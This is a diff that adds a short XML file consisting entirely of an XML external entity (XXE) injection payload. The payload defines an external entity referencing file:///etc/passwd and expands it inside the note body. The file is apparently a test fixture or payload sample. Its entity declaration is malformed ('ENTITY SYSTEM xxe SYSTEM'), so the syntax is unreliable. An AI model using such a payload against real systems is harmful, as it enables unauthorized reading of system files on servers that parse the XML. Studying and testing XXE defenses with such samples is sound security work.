@@ -1,0 +1,5 @@
+<!DOCTYPE note [ <!ENTITY SYSTEM xxe SYSTEM "file:///etc/passwd"> ]> 
+
+<note>
+	<body>&xxe;</body>
+</note>
